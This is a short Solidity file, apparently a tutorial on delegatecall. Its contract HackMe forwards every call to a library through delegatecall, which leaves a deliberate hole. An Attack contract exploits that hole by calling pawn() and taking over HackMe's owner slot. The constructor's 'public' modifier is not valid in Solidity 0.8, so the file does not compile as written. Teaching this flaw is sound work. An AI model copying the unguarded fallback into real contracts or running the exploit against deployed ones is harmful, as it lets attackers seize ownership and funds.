// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// delegate call is a low level function that allows contract to execute code of the another contract in context of callers contract
// it uses callers storage,address etc
// storage layout must be the same for both the contracts

contract HackMe{
    address public owner;
    Lib public lib;

    constructor(Lib _lib) public{
        owner=msg.sender;
        lib=Lib(_lib);
    }

    fallback() external payable{
        address(lib).delegatecall(msg.data);
    }
}

contract Lib{
    address public owner;
    function pawn() public{
        owner=msg.sender;
    }
}

contract Attack{
    address public hackMe;
    constructor(address _hackMe){
        hackMe=_hackMe;
    }

    function attack() public{
        hackMe.call(abi.encodeWithSignature("pawn()"));
    }
}